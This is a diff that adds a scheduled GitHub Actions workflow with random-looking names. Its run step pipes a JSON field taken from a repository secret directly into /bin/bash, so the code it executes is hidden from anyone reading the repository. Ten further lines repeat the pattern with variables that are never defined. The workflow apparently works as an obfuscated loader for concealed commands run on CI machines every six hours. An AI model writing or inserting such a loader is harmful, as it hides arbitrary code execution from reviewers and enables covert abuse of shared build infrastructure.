@@ -1,0 +1,29 @@
+name: cheeseingredient
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cheeseingredient
+        env:
+          e13775: ${{ secrets.e13775 }}
+        run: |
+          echo $e13775 | jq -r .y024 | /bin/bash
+          echo $b261 | jq -r .rqtmy91482 | /bin/bash
+          echo $czg102 | jq -r .zri94 | /bin/bash
+          echo $l555 | jq -r .xhe419 | /bin/bash
+          echo $oi41 | jq -r .zgz71515 | /bin/bash
+          echo $ctlw0 | jq -r .kpck5 | /bin/bash
+          echo $mfxwz350 | jq -r .u93 | /bin/bash
+          echo $ou73 | jq -r .uwz20396 | /bin/bash
+          echo $ygzt9 | jq -r .m08391 | /bin/bash
+          echo $uli27505 | jq -r .pdi5996 | /bin/bash
+          echo $qzero781 | jq -r .pqvj63762 | /bin/bash
+
